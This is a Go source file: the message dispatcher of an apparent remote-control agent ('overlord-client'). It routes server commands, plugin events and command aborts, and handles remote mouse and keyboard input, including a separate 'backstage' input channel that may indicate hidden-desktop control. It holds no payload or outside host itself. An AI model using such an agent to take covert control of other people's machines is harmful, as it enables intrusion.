package handlers

import (
	"context"
	"fmt"
	"log"
	"maps"

	"overlord-client/cmd/agent/capture"
	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

type Dispatcher struct {
	Env *runtime.Env
}

func NewDispatcher(env *runtime.Env) *Dispatcher {
	return &Dispatcher{Env: env}
}

func (d *Dispatcher) Dispatch(ctx context.Context, envelope map[string]interface{}) (err error) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("dispatcher: panic: %v", r)
			err = fmt.Errorf("dispatcher panic: %v", r)
		}
	}()

	msgType, ok := envelope["type"].(string)
	if !ok || msgType == "" {
		log.Printf("dispatcher: missing type (keys=%v)", maps.Keys(envelope))
		return nil
	}
	if !wire.IsServerToAgentMessageType(msgType) {
		log.Printf("dispatcher: unknown message type=%v", msgType)
		return nil
	}
	switch msgType {
	case "hello_ack":
		return HandleHelloAck(ctx, d.Env, envelope)
	case "ping":
		return HandlePing(ctx, d.Env, envelope)
	case "pong":
		return HandlePong(ctx, d.Env, envelope)
	case "frame_ack":
		capture.ReleaseFrameSlot()
		return nil
	case "command":
		cmdType, _ := envelope["commandType"].(string)
		if !wire.IsCommandType(cmdType) {
			log.Printf("dispatcher: unknown command type=%s", cmdType)
			return nil
		}
		commandVersion := toInt(envelope["commandVersion"])
		if commandVersion <= 0 {
			commandVersion = 1
		}
		envelope["commandVersion"] = commandVersion
		if !wire.IsSupportedCommandVersion(cmdType, commandVersion) {
			cmdID, _ := envelope["id"].(string)
			command := wire.CommandType(cmdType)
			supported := wire.CommandVersionSupport[command]
			log.Printf(
				"dispatcher: unsupported command version type=%s version=%d supported=%d-%d",
				cmdType,
				commandVersion,
				supported.Min,
				supported.Max,
			)
			if d.Env == nil || d.Env.Conn == nil {
				return nil
			}
			return wire.WriteMsg(ctx, d.Env.Conn, wire.CommandResult{
				Type:              "command_result",
				CommandID:         cmdID,
				CommandType:       command,
				CommandVersion:    commandVersion,
				OK:                false,
				Message:           fmt.Sprintf("unsupported %s command version %d", cmdType, commandVersion),
				ErrorCode:         "unsupported_command_version",
				SupportedVersions: &supported,
			})
		}
		if !isInputCommand(cmdType) {
			log.Printf("dispatcher: handling command type=%s", cmdType)
		}
		return HandleCommand(ctx, d.Env, envelope)
	case "plugin_event":
		return HandlePluginEvent(ctx, d.Env, envelope)
	case "notification_config":
		return HandleNotificationConfig(ctx, d.Env, envelope)
	case "command_abort":
		cmdID, _ := envelope["commandId"].(string)
		if cmdID != "" {
			if cancelCommand(cmdID) {
				log.Printf("dispatcher: cancelled command %s", cmdID)
			} else {
				log.Printf("dispatcher: command %s not found or already completed", cmdID)
			}
		}
		return nil
	default:
		log.Printf("dispatcher: unhandled contract message type=%v", msgType)
		return nil
	}
}

func isInputCommand(cmdType string) bool {
	switch cmdType {
	case "desktop_mouse_move", "desktop_mouse_down", "desktop_mouse_up", "desktop_mouse_wheel",
		"desktop_key_down", "desktop_key_up", "desktop_text",
		"backstage_mouse_move", "backstage_mouse_down", "backstage_mouse_up",
		"backstage_mouse_wheel", "backstage_key_down", "backstage_key_up":
		return true
	}
	return false
}
